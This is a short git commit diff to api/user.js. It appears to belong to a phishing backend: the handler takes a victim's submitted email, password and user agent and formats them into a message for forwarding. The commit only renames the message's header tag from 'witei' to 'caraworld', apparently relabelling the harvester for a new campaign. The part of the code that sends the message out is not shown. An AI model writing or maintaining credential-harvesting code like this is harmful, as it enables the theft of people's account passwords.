dd1820f7da379800be6f39b0c75ed950a7d7d080
riverarentxl-a11y <riverarentxl@gmail.com>
2026-05-11 10:50:45 +0300

    Update user.js

--- api/user.js
+++ api/user.js
@@ -11,7 +11,7 @@ module.exports = async function handler(req, res) {
     const { email, pass, agent } = req.body;
 
     const message = `
-📩  witei
+📩  caraworld
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
